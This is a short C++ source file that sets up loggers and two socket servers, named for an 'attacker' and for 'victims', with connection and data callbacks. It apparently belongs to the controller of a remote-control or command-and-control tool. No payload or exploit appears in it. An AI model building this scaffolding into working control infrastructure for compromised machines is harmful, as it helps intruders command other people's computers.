/*
 * context.cpp
 *
 *  Created on: Jul 1, 2018
 *      Author: hugo
 */

#include "controller/context.hpp"

#include "controller/server_attacker.hpp"
#include "controller/server_victims.hpp"

namespace Context {

	Logger *logger_app;
	Logger *logger_attacker;
	Logger *logger_victims;

	// Servers
	SocketServer *server_attacker;
	SocketServer *server_victims;

	void init_resources(){

		logger_app = new ConsoleLogger("APP", debug_enable);
		logger_attacker = new ConsoleLogger("SERVER_ATTACKER", debug_enable);
		logger_victims = new ConsoleLogger("SERVER_VICTIMS", debug_enable);

		// Attacker Server
		server_attacker = new SocketServer(server_attacker_port, *logger_attacker);
		server_attacker->on_connection_open.add(Attacker::on_connection_open_callback);
		server_attacker->on_data_received.add(Attacker::on_connection_received_data_callback);
		server_attacker->on_connection_close.add(Attacker::on_connection_close_callback);

		// Victims Server
		server_victims = new SocketServer(server_victims_port, *logger_victims);
		server_victims->on_connection_open.add(Victims::on_connection_open_callback);
		server_victims->on_data_received.add(Victims::on_connection_received_data_callback);
		server_victims->on_connection_close.add(Victims::on_connection_close_callback);
	}
}
